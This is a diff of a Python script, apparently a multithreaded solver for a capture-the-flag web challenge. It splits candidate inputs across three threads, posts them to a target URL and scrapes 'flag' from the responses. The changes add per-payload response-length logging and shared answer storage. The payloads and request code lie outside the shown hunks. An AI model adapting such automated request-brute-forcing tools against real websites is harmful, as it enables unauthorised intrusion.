@@ -60,6 +60,9 @@ for i in s:#修改这里！！！！！！！！！！！！！！！！！！�
 L1=[]
 L2=[]
 L3=[]
+answer=[]
+answer.append('Not Found!')
+resultpack={}
 for c in range(50):
     if not datt:
         break
@@ -82,7 +85,6 @@ class Exploitthread(threading.Thread):
         self.postcode=postcode
         self.name=name
     def run(self):
-        tem = 0
         print("%s Thread Starting Exploit....."% self.name)
         len1=-1
         len2=-2
@@ -99,19 +101,19 @@ class Exploitthread(threading.Thread):
                 time.sleep(3)
                 exit(0)
             result = response.read().decode('utf8')
+            print(len(result),end=":")
+            print(x)
+            resultpack[x]=len(result)
             if result.find('flag') == -1:
                 continue
             else:
                 pattern = r'flag(.*)<'
                 Final = re.findall(pattern, result)
-                print("\n")
-                print('The answer:', end='')
-                print(Final.pop())
-                tem = 1
+                answer.pop()
+                answer.append(Final.pop())
                 break
-        if tem == 0:
-            print('%s Thread Result:No Answer!'% self.name)
-
+        print('%s Thread Result:' % self.name)
+        print(answer[0])
 thread1=Exploitthread(datt=L1,postcode=postcode,url=url,name='First')
 thread2=Exploitthread(datt=L2,postcode=postcode,url=url,name='Second')
 thread3=Exploitthread(datt=L3,postcode=postcode,url=url,name='Third')
